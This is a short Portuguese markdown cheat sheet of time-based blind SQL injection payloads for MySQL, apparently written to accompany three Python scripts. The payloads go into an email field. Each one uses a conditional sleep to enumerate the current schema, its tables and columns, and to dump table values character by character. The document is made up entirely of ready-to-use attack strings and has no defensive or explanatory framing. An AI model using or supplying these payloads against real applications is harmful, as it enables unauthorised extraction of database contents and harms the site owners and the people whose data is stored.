# SQLi

# Time Based

## Payloads
## SQLi_single_value.py
- Obter o primeiro valor de um campo específico da tabela:
`hacker@mail.com' or if(ascii(substring((select {coluna} from {tabela} limit 1),{i},1))={ord(c)}, sleep(5), 0) #`
- Obter uma linha específica de uma tabela:
`hacker@mail.com' or if(ascii(substring((select {coluna} from {tabela} limit 1 offset {linha}),{i},1))={ord(c)}, sleep(5), 0) #`

## SQLi_enum_schema.py
- Obter tamanho do schema atual:
`hacker@mail.com' or if(length(database())={tamanho}, sleep(2), 0) #`
- Obter nome do schema atual:
`hacker@mail.com' or if(ascii(substring(database(),{i},1))={ord(c)}, sleep(5), 0) #`
- Obter tabelas de um schema:
`hacker@mail.com' or if(ascii(substring((select table_name from information_schema.tables where table_schema = "{schema}" limit 1 offset {linha}),{i},1))={ord(c)}, sleep(5), 0) #`
- Obter colunas da tabela:
`hacker@mail.com' or if(ascii(substring((select column_name from information_schema.columns where table_name = '{tabela}' limit 1 offset {linha}),{i},1))={ord(c)}, sleep(5), 0) #`

## SQLi_dump.py
- Obter todos valores de uma tabela:
`hacker@mail.com' or if(ascii(substring((select {coluna} from {tabela} limit 1 offset {linha}),{i},1))={ord(c)}, sleep(5), 0) #`

